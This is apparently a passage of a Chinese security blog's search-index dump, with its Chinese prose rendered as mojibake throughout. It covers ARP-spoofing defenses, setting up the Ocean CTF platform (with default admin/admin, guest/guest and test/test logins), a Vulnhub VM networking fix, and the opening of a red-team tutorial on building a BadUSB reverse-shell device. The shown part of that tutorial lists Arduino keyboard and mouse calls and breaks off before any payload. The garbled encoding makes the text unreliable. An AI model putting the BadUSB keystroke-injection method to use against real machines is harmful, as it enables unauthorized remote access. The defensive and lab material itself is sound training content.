class="line">store=activeï¼šè®¾ç½®ä¸ºä¸´æ—¶ç»‘å®š</span><br><span class="line"><span class="number">4</span>ã€ä¸´æ—¶ç»‘å®šï¼Œæ°¸ä¹…ç”Ÿæ•ˆ</span><br><span class="line">netsh -c i i add neighbors IDå·(<span class="number">7</span>) ç½‘å…³ip ç½‘å…³macåœ°å€ store=persistent</span><br><span class="line">store=persistentï¼šæ°¸ä¹…ç”Ÿæ•ˆ</span><br><span class="line">é—®é¢˜ï¼šåœ¨ä½¿ç”¨å‘½ä»¤çš„æ—¶å€™ä¼šæ˜¾ç¤ºå¯¹è±¡å·²ç»å­˜åœ¨</span><br><span class="line">è€Œé€šè¿‡ã€arp -d <span class="number">192.168</span>.<span class="number">1.1</span>ã€‘è¿›è¡Œçš„åˆ é™¤æ˜¯ä¸ç”Ÿæ•ˆçš„ï¼Œä¸å¥½ç”¨</span><br><span class="line">å› æ­¤ç”¨ã€netsh -c i i delete ne <span class="number">7</span>ã€‘è¿™ä¸ª<span class="number">7</span>æ˜¯ç½‘å¡IDï¼Œåˆ é™¤è¿™ä¸ªç½‘å¡çš„é…ç½®</span><br></pre></td></tr></table></figure><h3 id="3ã€Linuxé˜²å¾¡"><a href="#3ã€Linuxé˜²å¾¡" class="headerlink" title="3ã€Linuxé˜²å¾¡"></a>3ã€Linuxé˜²å¾¡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€æŸ¥è¯¢arp è¡¨å‘½ä»¤ï¼š</span><br><span class="line">å¥½åƒã€arp -aã€‘ä¹Ÿå¯ä»¥ç”¨ï¼Œä½†æ˜¯Linuxä¸­ä¸å¸¸ç”¨</span><br><span class="line">ã€ip nã€‘æˆ–è€…ç”¨ã€ip neighã€‘è¿›è¡ŒæŸ¥è¯¢</span><br><span class="line"><span class="number">2</span>ã€ä¸´æ—¶æ·»åŠ é™æ€åœ°å€ï¼Œé‡å¯åå¤±æ•ˆ</span><br><span class="line">arp -s ç½‘å…³ip ç½‘å…³macåœ°å€</span><br><span class="line"><span class="number">3</span>ã€æ·»åŠ é™æ€åœ°å€ï¼Œæ°¸ä¹…ç”Ÿæ•ˆ</span><br><span class="line">å°†ä¸‹é¢è¿™ä¸ªæ·»åŠ åˆ°rc.localé‡Œè¾¹ï¼Œå¹¶è®¾ç½® å¼€æœºè‡ªå¯æ‰§è¡Œ</span><br><span class="line">vi  /etc/rc.local</span><br><span class="line">chmod +x /etc/rc.d/rc.local</span><br><span class="line">æ·»åŠ ï¼š</span><br><span class="line">arp -s <span class="number">192.168</span>.<span class="number">110.1</span> e4:<span class="number">3</span>a:<span class="number">6</span>e:<span class="number">35</span>:<span class="number">98</span>:<span class="number">00</span></span><br><span class="line">wqä¿å­˜</span><br></pre></td></tr></table></figure><h3 id="4ã€è·¯ç”±-ç½‘å…³é˜²æŠ¤è®¾ç½®"><a href="#4ã€è·¯ç”±-ç½‘å…³é˜²æŠ¤è®¾ç½®" class="headerlink" title="4ã€è·¯ç”±&#x2F;ç½‘å…³é˜²æŠ¤è®¾ç½®"></a>4ã€è·¯ç”±&#x2F;ç½‘å…³é˜²æŠ¤è®¾ç½®</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€å¼€å¯è·¯ç”±å™¨é…ç½®ç½‘ç»œ</span><br><span class="line">ä¸€èˆ¬æ˜¯http:<span class="comment">//ç½‘å…³ip</span></span><br><span class="line"><span class="number">2</span>ã€åœ¨æ›´å¤šçš„å±€åŸŸç½‘è®¾ç½®ä¸­æœ‰ä¸€ä¸ªé™æ€ipåœ°å€ç»‘å®šåˆ—è¡¨</span><br><span class="line">å¯ä»¥å¯¹ç½‘å…³è¿›è¡Œé™æ€ç»‘å®šæˆ–æ‰§è¡Œç»‘å®šã€‚</span><br><span class="line">åŒæ—¶è¿˜éœ€è¦å¯¹pcç«¯è¿›è¡Œä¸€ä¸ªç»‘å®šã€‚</span><br><span class="line">è¦ä¸ç„¶åœ¨è¿›è¡ŒARPæ”»å‡»çš„æ—¶å€™ï¼Œæ¬ºéª—ä¸åˆ°è·¯ç”±äº†å´èƒ½æ¬ºéª—é¶æœºï¼Œä¹Ÿä¼šå‡ºé—®é¢˜ã€‚</span><br></pre></td></tr></table></figure><h3 id="5ã€WebæœåŠ¡å™¨é˜²å¾¡ARP"><a href="#5ã€WebæœåŠ¡å™¨é˜²å¾¡ARP" class="headerlink" title="5ã€WebæœåŠ¡å™¨é˜²å¾¡ARP"></a>5ã€WebæœåŠ¡å™¨é˜²å¾¡ARP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">webæœåŠ¡é˜²å¾¡æ˜æ–‡ä¼ è¾“æ³„éœ²ç”¨æˆ·ä¿¡æ¯çš„æ‰‹æ®µï¼šä½¿ç”¨åŠ å¯†åè®®ï¼šhttps</span><br><span class="line">1ã€ä»€ä¹ˆæ˜¯http</span><br><span class="line">è¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼Œæ˜¯ä¸€ä¸ªåŸºäºè¯·æ±‚ä¸å“åº”ï¼Œæ— çŠ¶æ€çš„ï¼Œåº”ç”¨å±‚çš„åè®®ï¼Œå¸¸åŸºäºtcp/ipåè®®ä¼ è¾“æ•°æ®ã€‚</span><br><span class="line">2ã€ä»€ä¹ˆæ˜¯https</span><br><span class="line">httpsæ˜¯èº«æŠ«sslå¤–å£³çš„ httpã€‚httpsæ˜¯ä¸€ç§é€šè¿‡è®¡ç®—æœºç½‘ç»œè¿›è¡Œå®‰å…¨é€šä¿¡çš„ä¼ è¾“åè®®ï¼Œç»è¿‡httpè¿›è¡Œé€šä¿¡ï¼Œåˆ©ç”¨SSL/TLSå»ºç«‹å…¨ä¿¡é“ï¼ŒåŠ å¯†æ•°æ®åŒ…ã€‚</span><br><span class="line">ä½¿ç”¨åŠ å¯†ä¼ è¾“ï¼Œä¸å®¹æ˜“è¢«æ‹¦æˆªï¼Œæ›´åŠ å®‰å…¨ã€‚</span><br><span class="line">TLSæ˜¯ä¼ è¾“å±‚åŠ å¯†åè®®ï¼Œå‰èº«æ˜¯SSLåè®®ã€‚</span><br><span class="line">httpsåŠ å¯†é€šä¿¡å·¥ä½œåŸç†ï¼šéœ€è¦ç”¨åˆ°è¯ä¹¦å’Œç§é’¥ã€å…¬é’¥ã€‚</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> çº¢é˜Ÿå…¥ä¾µ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ARPæ¬ºéª— </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€å…¶ä»–ç»éªŒã€‘Ocean CTF å¹³å°æ­å»º</title>
      <link href="/2024/04/14/Extracurricular-experience-OceanCTF-System-build/"/>
      <url>/2024/04/14/Extracurricular-experience-OceanCTF-System-build/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€å…¶ä»–ç»éªŒã€‘Ocean-CTF-å¹³å°æ­å»º"><a href="#ã€å…¶ä»–ç»éªŒã€‘Ocean-CTF-å¹³å°æ­å»º" class="headerlink" title="ã€å…¶ä»–ç»éªŒã€‘Ocean CTF å¹³å°æ­å»º"></a>ã€å…¶ä»–ç»éªŒã€‘Ocean CTF å¹³å°æ­å»º</h1><h1 id="ä¸€ã€ä»‹ç»"><a href="#ä¸€ã€ä»‹ç»" class="headerlink" title="ä¸€ã€ä»‹ç»"></a>ä¸€ã€ä»‹ç»</h1><p>ä¸€ä¸ªåŠ¨æ€flagç»ƒä¹ é¶åœºå¹³å°</p><p>å…·å¤‡å¦‚ä¸‹å¤šç§åŠŸèƒ½ï¼š</p><ul><li>å®¹å™¨ç®¡ç†</li><li>é¢˜åº“ç®¡ç†</li><li>åŠ¨æ€flag</li><li>ä½œå¼Šæ£€æµ‹</li><li>å…¬å‘Šé€šçŸ¥</li><li>åŠ¨æ€å¯åŠ¨é¢˜åº“</li><li>é¢˜åº“éš”ç¦»</li><li>å…¬å‘Šé€šçŸ¥</li><li>æ’è¡Œæ¦œ</li><li>å¿«é€Ÿéƒ¨ç½²</li><li>å¤§å±å±•ç¤º</li><li>æƒé™åˆ†ç¦»</li><li>ä¸€é”®éƒ¨ç½²</li><li>å¤šç«¯å£å¼€æ”¾</li><li>composeå®¹å™¨æ”¯æŒ</li><li>fix bug</li><li>æ·»åŠ é•œåƒåŠŸèƒ½é¡µé¢é‡æ„</li><li>æ¼æ´å¤ç°</li></ul><h1 id="äºŒã€é¢„è§ˆ"><a href="#äºŒã€é¢„è§ˆ" class="headerlink" title="äºŒã€é¢„è§ˆ"></a>äºŒã€é¢„è§ˆ</h1><p>çº¿ä¸Šåœ°å€ <a href="http://ctf.lostpeach.cn/">http://ctf.lostpeach.cn/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æµ‹è¯•ç”¨æˆ·: test/test</span><br></pre></td></tr></table></figure><p>ç®¡ç†åå° <a href="http://ctf.lostpeach.cn/manager">http://ctf.lostpeach.cn/manager</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è®¿å®¢ç®¡ç†è´¦å· guest/guest</span><br></pre></td></tr></table></figure><p><img src="/img/Extracurricular-experience-OceanCTF-System-build/image-20240414171221577.png" alt="image-20240414171221577"></p><p><img src="/img/Extracurricular-experience-OceanCTF-System-build/image-20240414171303522.png" alt="image-20240414171303522"></p><p><img src="/img/Extracurricular-experience-OceanCTF-System-build/image-20240414171208526.png" alt="image-20240414171208526"></p><p><img src="/img/Extracurricular-experience-OceanCTF-System-build/image-20240414171335032.png" alt="image-20240414171335032"></p><p><img src="/img/Extracurricular-experience-OceanCTF-System-build/image-20240414171538361.png" alt="image-20240414171538361"></p><h1 id="ä¸‰ã€å®‰è£…"><a href="#ä¸‰ã€å®‰è£…" class="headerlink" title="ä¸‰ã€å®‰è£…"></a>ä¸‰ã€å®‰è£…</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/tongchengbin/ocean_ctf.git /opt/ocean_ctf</span><br><span class="line">cd /opt/ocean_ctf</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>åˆå§‹åŒ–ç³»ç»Ÿ è®¿é—® &#x2F;manager</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é»˜è®¤è´¦å· admin/admin</span><br></pre></td></tr></table></figure><h1 id="å››ã€èµ›é¢˜"><a href="#å››ã€èµ›é¢˜" class="headerlink" title="å››ã€èµ›é¢˜"></a>å››ã€èµ›é¢˜</h1><p>é€šè¿‡è™šæ‹ŸåŒ–-èµ„æºä¸­å¿ƒæ·»åŠ é¢˜ç›®èµ„æºï¼Œé¢˜ç›®èµ„æºå¯ä»¥ä½¿ç”¨æœ¬åœ°é•œåƒã€è¿œç¨‹é•œåƒã€å¦‚CTFDBé¡¹ç›®ä¸­æä¾›äº†é»˜è®¤é¢˜ç›®å¯ä»¥é€šè¿‡åŒæ­¥åŠŸèƒ½æ‹‰å–é¢˜åº“æˆ–åœ¨<a href="https://gitee.com/link?target=https://hub.docker.com/r/tongchengbin/easy_web">dockerhub</a>ä¸­æŸ¥çœ‹é¢˜ç›®</p><p>æ·»åŠ èµ„æºåéœ€è¦è¿›è¡Œç¼–è¯‘ï¼ˆPULLï¼‰ã€å› ä¸ºç¼–è¯‘æ˜¯ä¸ªæ¯”è¾ƒè€—æ—¶çš„æ“ä½œ(å’Œç½‘ç»œç¯å¢ƒæœ‰å…³)ã€æ‰€ä»¥å»ºè®®å…ˆæœ¬åœ°dockeræ‹‰å–imageåç‚¹å‡»ç¼–è¯‘æŒ‰é’®ã€‚ ä¹‹ååœ¨CTFä¸­æ·»åŠ èµ›äº‹é¢˜åº“é€‰æ‹©åŠ¨æ€é¢˜ç›®å’Œå¯¹åº”çš„èµ„æºç¯å¢ƒå³å¯ã€‚</p><p>é¢˜åº“ä»“åº“ï¼š<a href="https://gitee.com/link?target=https://github.com/tongchengbin/ctfdb">GitHub - tongchengbin&#x2F;ctfdb: ctf é¢˜åº“</a></p><h1 id="äº”ã€æ¼æ´å¤ç°"><a href="#äº”ã€æ¼æ´å¤ç°" class="headerlink" title="äº”ã€æ¼æ´å¤ç°"></a>äº”ã€æ¼æ´å¤ç°</h1><p>æ¼æ´å¤ç°æ”¯æŒvulhub éƒ¨åˆ†é•œåƒå¯ä»¥ç›´æ¥å¯¼å…¥ï¼Œä½†æ˜¯æ¨èä½¿ç”¨<a href="https://gitee.com/link?target=https://github.com/tongchengbin/ctfdb">CTFDB Vulnerability</a> ä»“åº“è¿›è¡Œç»´æŠ¤,å†…ç½®exportè„šæœ¬æ”¯æŒè‡ªåŠ¨æ‰«æå¯¼å‡ºæ¼æ´æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å¯ä»¥åœ¨å¹³å° æ¼æ´å¤ç°-æ¼æ´èµ„æºä¸­å¯¼å…¥</p><p><img src="/img/Extracurricular-experience-OceanCTF-System-build/image-20240414171606404.png" alt="image-20240414171606404"></p>]]></content>
      
      
      <categories>
          
          <category> å…¶ä»–ç»éªŒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFå¹³å° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€å…¶ä»–ç»éªŒã€‘Vulnhubé¶æœºæ‰«æä¸åˆ°IP</title>
      <link href="/2024/04/13/Extracurricular-experience-Vulnhub-IP-correct/"/>
      <url>/2024/04/13/Extracurricular-experience-Vulnhub-IP-correct/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€å…¶ä»–ç»éªŒã€‘Vulnhubé¶æœºæ‰«æä¸åˆ°IP"><a href="#ã€å…¶ä»–ç»éªŒã€‘Vulnhubé¶æœºæ‰«æä¸åˆ°IP" class="headerlink" title="ã€å…¶ä»–ç»éªŒã€‘Vulnhubé¶æœºæ‰«æä¸åˆ°IP"></a>ã€å…¶ä»–ç»éªŒã€‘Vulnhubé¶æœºæ‰«æä¸åˆ°IP</h1><h3 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h3><p>Vulnhub é¶åœºä¸­éƒ¨åˆ†é¶æœºæ˜¯virtual boxç±»å‹çš„é¶æœºï¼Œé‚£ä¹ˆå¯¼å…¥VMwareä¸­å¯èƒ½ä¼šå‡ºç°ç½‘ç»œé…ç½®é—®é¢˜ï¼Œå¯¼è‡´æ‰«æä¸åˆ°é¶æœºçš„IPåœ°å€</p><h3 id="äºŒã€å·¥å…·"><a href="#äºŒã€å·¥å…·" class="headerlink" title="äºŒã€å·¥å…·"></a>äºŒã€å·¥å…·</h3><p>æˆ‘ä»¬ä½¿ç”¨ OVFTool_x64 å·¥å…·</p><p>ä¸‹è½½åœ°å€ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1ã€åœ¨ç™¾åº¦ç½‘ç›˜ä¸­ç›´æ¥ä¸‹è½½</span><br><span class="line">2ã€å…¶ä»–ç™¾åº¦ç½‘ç›˜ä¸‹è½½é“¾æ¥ï¼šhttps://pan.baidu.com/s/1YDtHh0-OnK0Lm5C4KoF4-w</span><br></pre></td></tr></table></figure><h3 id="ä¸‰ã€ä½¿ç”¨"><a href="#ä¸‰ã€ä½¿ç”¨" class="headerlink" title="ä¸‰ã€ä½¿ç”¨"></a>ä¸‰ã€ä½¿ç”¨</h3><p>å°†å·¥å…·è§£å‹åˆ°.ova åŒç›®å½•ä¸‹</p><p><img src="/img/Extracurricular-experience-Vulnhub-IP-correct/image-20240213201837478.png" alt="image-20240213201837478"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ovftool.exe Potato.ova Potato.ovf</span><br></pre></td></tr></table></figure><p><img src="/img/Extracurricular-experience-Vulnhub-IP-correct/image-20240213202710982.png" alt="image-20240213202710982"></p><p>ç„¶åç”¨è®°äº‹æœ¬æ‰“å¼€ <code>Potato.ovf</code>æ–‡ä»¶ï¼Œä¿®æ”¹æˆä½ çš„vmç‰ˆæœ¬ä¿¡æ¯ã€‚å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;vssd:VirtualSystemType&gt;vmx-17.0&lt;/vssd:VirtualSystemType&gt;</span><br></pre></td></tr></table></figure><p>ä¿å­˜ä¹‹åï¼Œ<a href="https://tool.lu/filehash/">åœ¨çº¿ç½‘ç«™ </a>æŸ¥çœ‹è¯¥.ovfæ–‡ä»¶çš„SHA1 å€¼</p><p><img src="/img/Extracurricular-experience-Vulnhub-IP-correct/image-20240213203357283.png" alt="image-20240213203357283"></p><p>å¤åˆ¶SHA1 å€¼å¹¶ä¿®æ”¹.mf æ–‡ä»¶ä¸­çš„ç¬¬ä¸€è¡Œ</p><p><img src="/img/Extracurricular-experience-Vulnhub-IP-correct/image-20240213203619115.png" alt="image-20240213203619115"></p><p>ä¿å­˜ä¹‹åï¼Œæˆ‘ä»¬åœ¨VMä¸­æ‰“å¼€.ovf æ–‡ä»¶å³å¯</p><p>æ³¨æ„ï¼šè¦é€‰æ‹©æ‰“å¼€.ovf æ–‡ä»¶ï¼Œå¹¶ä¸”éœ€è¦ç»™æ–°çš„è™šæ‹Ÿæœºèµ·ä¸€ä¸ªä»»æ„çš„åç§°</p><p><img src="/img/Extracurricular-experience-Vulnhub-IP-correct/image-20240213203927498.png" alt="image-20240213203927498"></p><p>æ‰“å¼€è™šæ‹Ÿæœºä¹‹åå°±å¯ä»¥å°†ç½‘ç»œè¿æ¥æ¨¡å¼æ”¹ä¸ºã€NATã€‘</p><h3 id="å››ã€å‚è€ƒé“¾æ¥"><a href="#å››ã€å‚è€ƒé“¾æ¥" class="headerlink" title="å››ã€å‚è€ƒé“¾æ¥"></a>å››ã€å‚è€ƒé“¾æ¥</h3><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/Mrs_H/article/details/120668701">https://blog.csdn.net/Mrs_H/article/details/120668701</a></p>]]></content>
      
      
      <categories>
          
          <category> å…¶ä»–ç»éªŒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€çº¢é˜Ÿè¿‘æºã€‘çº¢é˜Ÿå¿…å¤‡æŠ€èƒ½â€”BadUSBè¿‘æºæ”»å‡»</title>
      <link href="/2024/04/13/Red-Team-Invasion-BadUSB/"/>
      <url>/2024/04/13/Red-Team-Invasion-BadUSB/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€çº¢é˜Ÿè¿‘æºã€‘Uç›˜åå¼¹shellåˆ¶ä½œâ€”BadUSBæ”»å‡»"><a href="#ã€çº¢é˜Ÿè¿‘æºã€‘Uç›˜åå¼¹shellåˆ¶ä½œâ€”BadUSBæ”»å‡»" class="headerlink" title="ã€çº¢é˜Ÿè¿‘æºã€‘Uç›˜åå¼¹shellåˆ¶ä½œâ€”BadUSBæ”»å‡»"></a>ã€çº¢é˜Ÿè¿‘æºã€‘Uç›˜åå¼¹shellåˆ¶ä½œâ€”BadUSBæ”»å‡»</h1><h2 id="ä¸€ã€å·¥å…·å‡†å¤‡"><a href="#ä¸€ã€å·¥å…·å‡†å¤‡" class="headerlink" title="ä¸€ã€å·¥å…·å‡†å¤‡"></a>ä¸€ã€å·¥å…·å‡†å¤‡</h2><p>1ã€Arduino IDEï¼ˆç»™badusbå†™å…¥ä»£ç çš„è½¯ä»¶å·¥å…·ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç½‘ç›˜å·²æä¾›</span><br></pre></td></tr></table></figure><p>2ã€Badusbï¼ˆUç›˜ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">374</span>)<span class="number">32</span>U4 è™šæ‹Ÿé”®ç›˜ Badusb Leomardo USB ATMEGA32U4å¼€å‘æ¿å•ç‰‡</span><br></pre></td></tr></table></figure><p><img src="/img/Red-Team-Invasion-BadUSB/Untitled1.png" alt="Untitled1"></p><p>3ã€å¯èƒ½å‡ºç°çš„é—®é¢˜ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ä¸€èˆ¬æ¥è¯´ï¼Œé©±åŠ¨æ­£å¸¸ï¼Œåœ¨è®¾å¤‡ç®¡ç†å™¨ä¸­å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ï¼š</span><br><span class="line">å¦‚æœå¼‚å¸¸ï¼Œé’ˆå¯¹ä¸åŒå‹å·çš„badusb å¯ä»¥ç”¨é©±åŠ¨ç²¾çµä¸‹è½½å¯¹åº”çš„é©±åŠ¨</span><br></pre></td></tr></table></figure><p><img src="/img/Red-Team-Invasion-BadUSB/Untitled2.png" alt="Untitled"></p><h2 id="äºŒã€å¼€å§‹ç¼–å†™"><a href="#äºŒã€å¼€å§‹ç¼–å†™" class="headerlink" title="äºŒã€å¼€å§‹ç¼–å†™"></a>äºŒã€å¼€å§‹ç¼–å†™</h2><ol><li><p>æ‰“å¼€IDE ï¼Œé€‰æ‹©æ¿å­å’Œæ¥å£</p><p><img src="/img/Red-Team-Invasion-BadUSB/Untitled3.png" alt="Untitled"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åœ¨Arduino <span class="number">1.5</span>.<span class="number">5</span> ç‰ˆæœ¬ä¸­çš„è®¾ç½®ï¼š</span><br><span class="line"><span class="number">1</span>ã€åœ¨ã€å·¥å…·ã€‘--&gt;ã€ç‰ˆã€‘--&gt;ã€Arduino leonardoã€‘</span><br><span class="line"><span class="number">2</span>ã€åœ¨ã€ç«¯å£ã€‘--&gt;é€‰æ‹©å¯¹åº”çš„ç«¯å£</span><br></pre></td></tr></table></figure></li><li><p>ç¨‹åºä»‹ç»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">å¼€å‘ç‰ˆä¸­å°±åªæœ‰ä¸¤ç§å‡½æ•°ï¼š</span><br><span class="line"><span class="title function_ invoke__">setup</span>()ï¼šå°±æ˜¯æ’å…¥badusb ä¹‹åæ‰§è¡Œçš„ä»£ç ï¼Œæ‰§è¡Œä¸€æ¬¡ã€‚æˆ‘ä»¬ä¸€èˆ¬å°†æ”»å‡»ä»£ç å†™å…¥è¿™é‡Œ</span><br><span class="line"><span class="title function_ invoke__">loop</span>()ï¼šæ˜¯æ’å…¥åå¾ªç¯æ‰§è¡Œçš„ä»£ç ã€‚å¦‚æœä¸å†™æ˜å¾ªç¯æ¡ä»¶ï¼Œå°±ä¼šä¸€ç›´å¾ªç¯æ‰§è¡Œä»£ç ï¼Œå¯¼è‡´ä¸å¥½çš„ç»“æœï¼ˆå› æ­¤ä¸€èˆ¬ä¸ç”¨è¿™ä¸ªå‡½æ•°ï¼‰</span><br><span class="line">å¦‚ï¼šå¦‚æœå†™å…¥ä¸æ–­æŒ‰F5çš„å¾ªç¯ä»£ç ï¼Œå¯èƒ½æ’ä¸Šåï¼Œç”µè„‘å°±ä¼šæ­»æœºã€‚</span><br><span class="line"></span><br><span class="line">Mouse.<span class="title function_ invoke__">begin</span>()<span class="comment">//é¼ æ ‡äº‹ä»¶å¼€å§‹</span></span><br><span class="line">Mouse.<span class="title function_ invoke__">click</span>()<span class="comment">//é¼ æ ‡å•å‡»</span></span><br><span class="line">Mouse.<span class="title function_ invoke__">end</span>()<span class="comment">//é¼ æ ‡äº‹ä»¶ç»“æŸ</span></span><br><span class="line">Mouse.<span class="title function_ invoke__">move</span>()<span class="comment">//é¼ æ ‡ç§»åŠ¨(x,y)</span></span><br><span class="line">Mouse.<span class="title function_ invoke__">press</span>()<span class="comment">//é¼ æ ‡æŒ‰ä¸‹</span></span><br><span class="line">Mouse.<span class="title function_ invoke__">release</span>()<span class="comment">//é¼ æ ‡æ¾å¼€</span></span><br><span class="line">Mouse.<span class="title function_ invoke__">isPressed</span>()<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">KEY_LEFT_CTRL</span><br><span class="line">KEY_LEFT_SHIFT</span><br><span class="line">KEY_LEFT_ALT</span><br><span class="line">KEY_LEFT_GUI<span class="comment">//æŒ‰ä¸‹winé”®</span></span><br><span class="line">KEY_RIGHT_CTRL</span><br><span class="line">KEY_RIGHT_SHIFT</span><br><span class="line">KEY_RIGHT_ALT</span><br><span class="line">KEY_RIGHT_GUI</span><br><span class="line">KEY_UP_ARROW</span><br><span class="line">KEY_DOWN_ARROW</span><br><span class="line">KEY_LEFT_ARROW</span><br><span class="line">KEY_RIGHT_ARROW</span><br><span class="line">KEY_BACKSPACE</span><br><span class="line">KEY_TAB</span><br><span class="line">KEY_RETURN</span><br><span class="line">KEY_ESC</span><br><span class="line">KEY_INSERT</span><br><span class="line">KEY_DELETE</span><br><span class="line">KEY_PAGE_UP</span><br><span class="line">KEY_PAGE_DOWN</span><br><span class="line">KEY_HOME</span><br><span class="line">KEY_END</span><br><span class="line">KEY_CAPS_LOCK<span class="comment">//é‡Šæ”¾å¤§å†™</span></span><br><span class="line">KEY_F1</span><br><span class="line">KEY_F2</span><br><span class="line">KEY_F3</span><br><span class="line">KEY_F4</span><br><span class="line">KEY_F5</span><br><span class="line">KEY_F6</span><br><span class="line">KEY_F7</span><br><span class="line">KEY_F8</span><br><span class="line">KEY_F9</span><br><span class="line">KEY_F10</span><br><span class="line">KEY_F11</span><br><span class="line">KEY_F12</span><br><span class="line"></span><br><span class="line">Keyboard.<span class="title function_ invoke__">begin</span>(); <span class="comment">// åˆå§‹åŒ–é”®ç›˜åº“</span></span><br><span class="line"><span class="title function_ invoke__">delay</span>(<span class="number">2000</span>); <span class="comment">// ç­‰å¾… 2 ç§’é’Ÿï¼ˆ 2000 æ¯«ç§’ï¼‰</span></span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(<span class="string">&#x27;a&#x27;</span>); <span class="comment">// æŒ‰ä¸‹ &#x27;a&#x27; é”®</span></span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(KEY_LEFT_GUI); <span class="comment">// æŒ‰ä¸‹å·¦ Windows é”®</span></span><br><span class="line">Keyboard.<span class="title function_ invoke__">println</span>(<span class="string">&quot;Hello, World!&quot;</span>); <span class="comment">// è¾“å…¥å­—ç¬¦ä¸²</span></span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(KEY_LEFT_CTRL); <span class="comment">// æŒ‰ä¸‹å·¦ Ctrl é”®</span></span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(KEY_LEFT_ALT); <span class="comment">// æŒ‰ä¸‹å·¦ Alt é”®</span></span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(<span class="string">&#x27; &#x27;</span>); <span class="comment">// æŒ‰ä¸‹ç©ºæ ¼é”®</span></span><br><span class="line">Keyboard.<span class="title function_ invoke__">println</span>();<span class="comment">// æŒ‰ä¸‹å›è½¦é”®</span></span><br><span class="line">Keyboard.<span class="title function_ invoke__">release</span>(<span class="string">&#x27;r&#x27;</span>);<span class="comment">// é‡Šæ”¾ 